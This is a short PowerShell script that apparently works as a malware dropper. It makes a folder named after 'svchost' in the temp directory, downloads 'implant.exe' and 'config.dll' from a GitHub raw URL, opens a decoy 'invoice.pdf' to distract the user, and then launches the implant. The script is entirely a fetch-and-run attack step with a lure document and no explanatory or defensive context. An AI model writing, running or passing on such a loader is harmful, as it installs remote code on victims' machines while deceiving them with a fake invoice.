$d="$env:TEMP\svchost_test"
mkdir $d -Force|Out-Null
$s="https://raw.githubusercontent.com/Ac333e2/note/refs/heads/main"
iwr "$s/implant.exe" -OutFile "$d\implant.exe"
iwr "$s/config.dll" -OutFile "$d\config.dll"
iwr "$s/invoice.pdf" -OutFile "$d\invoice.pdf"
Start-Process "$d\invoice.pdf"
Start-Process "$d\implant.exe" -WorkingDirectory $d